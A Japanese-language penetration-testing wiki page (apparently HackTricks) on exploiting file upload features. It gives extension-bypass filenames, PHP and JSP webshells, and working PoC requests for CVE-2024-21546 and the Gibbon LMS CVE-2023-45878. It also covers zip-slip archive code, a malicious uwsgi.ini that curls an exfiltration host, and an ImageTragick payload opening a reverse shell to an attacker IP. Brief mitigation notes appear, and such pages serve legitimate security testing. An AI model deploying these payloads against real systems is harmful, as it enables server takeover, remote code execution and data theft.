# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロードの一般的な方法

その他の有用な拡張子:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 適用される場合は、**チェック**して**前述の拡張子**も確認してください。大文字も試してください: _pHp, .pHP5, .PhAr ..._
2. _**実行拡張子の前に有効な拡張子を追加することをチェック**（前述の拡張子も使用）:_
- _file.png.php_
- _file.png.Php5_
3. 末尾に**特殊文字を追加**してみてください。Burpを使って全ての**ascii**や**Unicode**文字を**bruteforce**することができます。 (_注: 前述で示した**拡張子**を使うこともできます_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバー側の拡張子パーサを**だます**ことで保護をバイパスできないか試してみてください（例：拡張子を**二重化**したり、拡張子の間に**ゴミ**データ（**null**バイト）を入れるなど）。_より良いペイロードを用意するために**前述の拡張子**を使うこともできます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前述のチェックに**さらに別の拡張子層**を追加してみてください:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **実行拡張子を有効な拡張子の前に置く**ことを試して、サーバーの設定ミスに期待してみてください。（Apacheのミスコンフィグで、拡張子が**.php**を含むものは**必ずしも .php で終わらなくても**コードが実行される場合に有効です）
- _ex: file.php.png_
7. **Windows**上の**NTFS alternate data stream (ADS)**を利用する方法。禁止された拡張子の後と許可された拡張子の前にコロン":"が挿入されます。その結果、サーバー上に**禁止された拡張子の空ファイル**が作成される可能性があります（例: "file.asax:.jpg"）。このファイルは、その後ショートファイル名を使うなど別の手法で編集できる場合があります。パターン "**::$data**" を使って非空ファイルを作成することも可能です。したがって、このパターンの後にドットを追加することは、更なる制限を回避するのに有用な場合があります（例: "file.asp::$data."）
8. ファイル名の長さ制限を壊すことを試してください。正しい拡張子が切り捨てられ、悪意あるPHPが残ることがあります。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

いくつかのupload handlerは保存時にファイル名の末尾のドット文字をトリムまたは正規化します。UniSharpのLaravel Filemanager (unisharp/laravel-filemanager) の2.9.1以前のバージョンでは、拡張子検証を次の方法でバイパスできます:

- 有効な画像のMIMEとmagic headerを使用する（例: PNGの `\x89PNG\r\n\x1a\n`）。
- アップロードするファイル名をPHP拡張子の後にドットを付けて命名する（例: `shell.php.`）。
- サーバーが末尾のドットを剥ぎ取り `shell.php` として保存し、web配信されるディレクトリ（デフォルトのpublic storage、例: `/storage/files/`）に配置されれば実行されます。

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
保存されたパスにアクセスします（典型的には Laravel + LFM）：
```
GET /storage/files/0xdf.php?cmd=id
```
### Content-Type、Magic Number、Compression & Resizing のバイパス

- **Content-Type** チェックは、**Content-Type** **header** の **value** を _image/png_、_text/plain_、_application/octet-stream_ に設定することでバイパスできる。
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** チェックは、ファイルの先頭に**実際の画像のバイト**を追加して回避できる（_file_ コマンドを混乱させる）。あるいはメタデータ内にシェルを挿入する:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` またはペイロードを画像内に直接挿入することも可能:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- もし画像に**圧縮**がかけられている場合（例えば [PHP-GD](https://www.php.net/manual/fr/book.image.php) のような標準的なPHPライブラリを使っている場合）、前述のテクニックは有効ではない。しかし、**PLTE chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) によって、**圧縮を生き残る**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Webページが例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` のような関数で画像を**リサイズ**している場合でも、**IDAT chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、**圧縮を生き残る**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 画像のリサイズ（PHP-GD の `thumbnailImage` など）を生き残るペイロードを作る別の手法として、**tEXt chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、**圧縮を生き残る**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### その他の確認すべきトリック

- 既にアップロードされたファイルを**rename** できる脆弱性を探す（拡張子を変更するため）。
- backdoor を実行するための **Local File Inclusion** 脆弱性を探す。
- **情報漏えいの可能性**:
1. 同じファイルを**複数回**（かつ**同時に**）アップロードする
2. 既に存在する**ファイル**や**フォルダ**と同じ**名前**でファイルをアップロードする
3. ファイル名に `"."`、`".."`、または `"…"` を使ってアップロードする。例えば Apache on **Windows** でアプリがアップロードファイルを "/www/uploads/" に保存する場合、"." という filename は "/www/" ディレクトリに "uploads" というファイルを作成することがある。
4. **NTFS** 上で **"…:.jpg"** のように簡単に削除できないファイルをアップロードする。（Windows）
5. Windows でファイル名に `|<>*?”` のような **無効な文字** を含むファイルをアップロードする。（Windows）
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9 のような **予約（禁止）名** を使って Windows にファイルをアップロードする。
- 被害者が誤って開いたときにコードが実行されるような実行ファイル（.exe）や、比較的怪しまれにくい .html を **アップロード**してみる。

### Special extension tricks

PHP サーバにファイルをアップロードしようとしている場合は、[take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution) を確認すること。\
ASP サーバにファイルをアップロードしようとしている場合は、[take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files) をチェックすること。

`.phar` ファイルは Java の `.jar` のようなもので、php 用のものであり、php で実行したり、スクリプト内で include したりして **php ファイルのように扱える**。
`.inc` 拡張子は時折インポート用の php ファイルに使われるため、ある時点でこの拡張子が **実行可能**になっている可能性がある。

## **Jetty RCE**

Jetty サーバに XML ファイルをアップロードできる場合、[RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** を取得できる可能性がある。したがって、以下の画像に示されているように、XML ファイルを `$JETTY_BASE/webapps/` にアップロードして shell を期待すること。

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

この脆弱性の詳細な検討については元の調査を確認してください: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)。

Remote Command Execution (RCE) の脆弱性は、`.ini` 設定ファイルを変更できる能力がある場合に uWSGI サーバで悪用され得る。uWSGI の設定ファイルは特殊な構文を持ち、"magic" 変数、プレースホルダ、オペレータを取り扱う。特に `@(filename)` として用いられる '@' オペレータはファイルの内容を include するために設計されている。uWSGI がサポートするさまざまなスキームの中で、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを可能にする。この機能は、`.ini` 設定ファイルが処理される際に Remote Command Execution や Arbitrary File Write/Read のような悪用に利用され得る。

以下は、さまざまなスキームを示す悪意ある `uwsgi.ini` ファイルの例を考えてみよう:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
payloadの実行は設定ファイルのパース中に発生します。設定が有効化されパースされるためには、uWSGIプロセスを再起動する必要があります（クラッシュ後やDenial of Service攻撃による再起動を含む可能性があります）、あるいはファイルをauto-reloadに設定しておく必要があります。auto-reload機能が有効な場合、変更を検知すると指定間隔でファイルを再読み込みします。

uWSGIの設定ファイルのパースが緩やかであることを理解しておくことが重要です。具体的には、ここで扱ったpayloadはバイナリファイル（imageやPDFなど）に埋め込むことができ、悪用の範囲がさらに広がります。

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMSの認証不要のエンドポイントにより、web root内への任意ファイル書き込みが可能で、PHPファイルを置くことでpre-auth RCEに至ります。脆弱なバージョン: up to and including 25.0.01。

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` （サーバはtype/nameを無視し、末尾をbase64デコードします）
- `path`: Gibbon install dirに対する相対の宛先ファイル名（例: `poc.php` や `0xdf.php`）
- `gibbonPersonID`: 非空の任意の値が受け付けられます（例: `0000000001`）

ファイルを書き込み・読み返すための最小PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
最小限のwebshellをアップロードしてコマンドを実行する:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
注記:
- ハンドラは `base64_decode($_POST["img"])` を `;` と `,` で分割した後に実行し、拡張子/タイプを検証せずにバイトを `$absolutePath . '/' . $_POST['path']` に書き込みます。
- 結果として実行されるコードは web サービスのユーザーとして実行されます（例: XAMPP Apache on Windows）。

この脆弱性の参照には usd HeroLab advisory と NVD のエントリが含まれます。以下の References セクションを参照してください。

## **wget File Upload/SSRF Trick**

場合によっては、サーバが **`wget`** を使って **download files** を行っており、あなたが **indicate** する **URL** を指定できることがあります。こうした場合、コードはダウンロードされるファイルの拡張子がホワイトリストに含まれているかを確認し、許可されたファイルのみがダウンロードされるようにしていることがあります。しかし、**this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **別のオプション**としてこのチェックをbypassするために考えられるのは、**HTTPサーバーを別のファイルにリダイレクトさせる**ことです。こうすると最初のURLはチェックをbypassしますが、その後wgetはリダイレクト先のファイルを新しい名前でダウンロードします。これは、wgetが**parameter** `--trust-server-names` を使って実行されている場合を**除き****動作しません**。なぜなら、**wgetは元のURLで指定されたファイル名でリダイレクト先ページをダウンロードする**からです。

### NTFS junctions (Windows) を使ってアップロードディレクトリを脱出する

(この攻撃にはWindowsマシンへのローカルアクセスが必要です) Windows上でアップロードがユーザーごとのサブフォルダ（例: C:\Windows\Tasks\Uploads\<id>\）に保存され、かつそのサブフォルダの作成/削除を制御できる場合、そのサブフォルダをdirectory junctionで機密場所（例: the webroot）を指すよう置き換えることができます。以降のアップロードはターゲットパスに書き込まれ、ターゲットがserver‑side codeを解釈する場合はコード実行を可能にします。

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). ウェブサーバのアカウントは junction をたどり、destination に対して書き込み権限を持っている必要があります。
- これにより任意のファイル書き込みがリダイレクトされます。もし destination がスクリプトを実行する（PHP/ASP）なら、RCE になります。
- 防御策: writable な upload roots を C:\Windows\Tasks の下やそれに類する場所で攻撃者が制御できないようにする；junction 作成をブロックする；サーバ側で拡張子を検証する；アップロードは別ボリュームに保存するか deny‑execute ACLs を設定する。

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

一部の upload/ingest handlers は、raw request body をユーザ制御の query パラメータから構築した filesystem path に書き込みます。ハンドラが Content-Encoding: gzip をサポートし、かつ destination path を正規化/検証しない場合、directory traversal と gzipped payload を組み合わせて、web-served directory に任意のバイトを書き込み RCE を得ることができます（例: Tomcat の webapps 配下に JSP を置く）。

Generic exploitation flow:
- server-side payload（例: minimal JSP webshell）を用意し、そのバイトを gzip 圧縮する。
- path パラメータ（例: token）が意図したフォルダを脱出する traversal を含み、file が永続化するファイル名を示すような POST を送る。Content-Type: application/octet-stream と Content-Encoding: gzip を設定し、body に圧縮済みペイロードを置く。
- 書き込まれたファイルにブラウズして実行をトリガーする。

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
次にトリガー：
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- ターゲットのパスはインストールごとに異なります（例: /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ のようなスタックもあります）。JSPを実行する任意のweb公開フォルダで動作します。
- Burp Suite’s Hackvertor extension は、ペイロードから正しい gzip body を生成できます。
- これは純粋な pre-auth arbitrary file write → RCE のパターンであり、multipart parsing に依存しません。

Mitigations
- アップロード先はサーバ側で決定すること。クライアントからのパス断片は決して信頼しない。
- パスを正規化し、解決されたパスが許可リストにあるベースディレクトリ内に収まることを強制する。
- アップロードは実行不可のボリュームに保存し、書き込み可能なパスからのスクリプト実行を拒否する。

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) は、ファイルアップロード機構のテストを支援するために設計された強力なツールです。Pentesters と Bug Hunters を支援し、様々な bug bounty テクニックを活用して脆弱性の発見と悪用を簡素化し、webアプリケーションの徹底的な評価を行えるようにします。

### Corrupting upload indices with snprintf quirks (historical)

`snprintf()` や類似の関数を使って、単一のファイルアップロードからマルチファイル配列を構築する古い upload handler の中には、`_FILES` 構造を偽造されるように騙せるものがあります。`snprintf()` の挙動の不一致や切り捨てのため、巧妙に作られた単一アップロードがサーバ側で複数のインデックス付きファイルとして現れ、厳密な形状を仮定するロジック（例えばマルチファイルとして扱い危険な分岐を取る）を混乱させます。今日ではニッチですが、この「index corruption」パターンは時折 CTF や古いコードベースで再出現します。

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- サーバに対して「URLから画像を取得してくる」よう指示できる場合、SSRF を悪用することを試みられます（[SSRF](../ssrf-server-side-request-forgery/index.html)）。その画像が公開サイトに保存されるなら、[https://iplogger.org/invisible/](https://iplogger.org/invisible/) のような URL を指定して、訪問者ごとの情報を**盗む**ことも可能です。
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS を引き起こすように細工した PDF: 次のページは **PDF データを注入して JS 実行を得る方法** を示しています: [../xss-cross-site-scripting/pdf-injection.md](../xss-cross-site-scripting/pdf-injection.md)。PDF をアップロードできるなら、示された手順に従って任意の JS を実行するような PDF を用意できます。
- サーバに **antivirus** があるか確認するために、\[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) の内容をアップロードしてみる
- ファイルアップロード時に **size limit** が設定されているか確認する

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

他のファイルタイプについては [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) を参照してください。

## Zip/Tar File Automatically decompressed Upload

サーバ内で展開される ZIP をアップロードできる場合、次の2つが可能です:

### Symlink

他のファイルへの soft links を含むリンクをアップロードし、解凍されたファイルにアクセスすると、リンク先のファイルにアクセスできます:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍

解凍時にディレクトリ内に予期しないファイルが作成される問題は重大です。 この構成が悪意あるファイルアップロードによるOSレベルのコマンド実行を防ぐだろうという当初の想定にもかかわらず、ZIPアーカイブ形式の階層的圧縮サポートとdirectory traversalの機能が悪用され得ます。これにより攻撃者は対象アプリケーションの解凍機能を操作して制限を回避し、安全なアップロードディレクトリから脱出できます。

そのようなファイルを作成するための自動化されたexploitは[**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)で入手できます。ユーティリティは以下のように使用できます:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** もオプションです。ターゲットが `/flag.txt` のようなファイルである場合、そのファイルへの symlink をシステム上に作成しておくべきです。これにより evilarc が動作中にエラーを起こさないようにできます。

以下は、悪意のある zip ファイルを作成するために使用される Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮を悪用した file spraying**

For further details **元の投稿を参照してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHPコードは `$_REQUEST` 変数を通して渡されたコマンドを実行するように書かれている。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルが作成され、これらを含むzipアーカイブが作成される。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviやhex editorで変更し、"xxA"を"../"にしてディレクトリを横断する。

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

バックエンドがZIPエントリをPHPのZipArchiveで検証する一方で、抽出処理がファイルシステムに対して生の名前を使って書き込む場合、ファイル名フィールドにNUL (0x00) を挿入することで許可されていない拡張子をスムッグルできます。ZipArchiveはエントリ名をC‑stringとして扱い、最初のNULで切り捨てます；ファイルシステムはNUL以降を含む完全な名前を書き込みます。

High-level flow:
- 有効なPDFなどの正当なコンテナファイルを用意し、ストリーム内に小さなPHPスタブを埋め込み、magic/MIMEがPDFのままになるようにする。
- それを`shell.php..pdf`のように命名してzipにし、ZIPのローカルヘッダとセントラルディレクトリのファイル名をヘックス編集して、`.php`の直後の最初の`.`を`0x00`に置き換え、`shell.php\x00.pdf`にする。
- ZipArchiveに依存する検証器は`shell.php .pdf`のように“見て”許可し、抽出処理はディスクに`shell.php`を書き込み、アップロードフォルダが実行可能であればRCEにつながる。

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
注意事項
- ファイル名の出現箇所は両方とも変更すること（local and central directory）。一部のツールは追加の data descriptor エントリを付けることもあるため – 存在する場合はすべての name フィールドを調整する。
- ペイロードファイルはまだ server‑side magic/MIME sniffing を通過する必要がある。PHP を PDF stream に埋め込むとヘッダが有効なままになる。
- enum/validation path と extraction/write path が文字列処理の扱いで不一致になる箇所でも機能する。

### Stacked/concatenated ZIPs（パーサの不一致）

2つの有効な ZIP ファイルを連結すると、異なるパーサが異なる EOCD レコードに注目するようなバイナリが生成される。多くのツールは最後の End Of Central Directory (EOCD) を検出するが、特定のワークフローでは ZipArchive のような一部のライブラリが最初に見つけたアーカイブを解析することがある。もし検証が最初のアーカイブを列挙し、抽出が最後の EOCD を尊重する別のツールを使うと、良性のアーカイブがチェックを通過し、悪意あるアーカイブが抽出される可能性がある。

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
悪用パターン
- Create a benign archive (allowed type, e.g., a PDF) and a second archive containing a blocked extension (e.g., `shell.php`).
- Concatenate them: `cat benign.zip evil.zip > combined.zip`.
- If the server validates with one parser (sees benign.zip) but extracts with another (processes evil.zip), the blocked file lands in the extraction path.

## ImageTragic

この内容を画像拡張子でアップロードすると、脆弱性 **(ImageMagick , 7.0.1-1)** を悪用できます（参照: [exploit](https://www.exploit-db.com/exploits/39767)）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGのIDATチャンクにPHP Shellを埋め込む

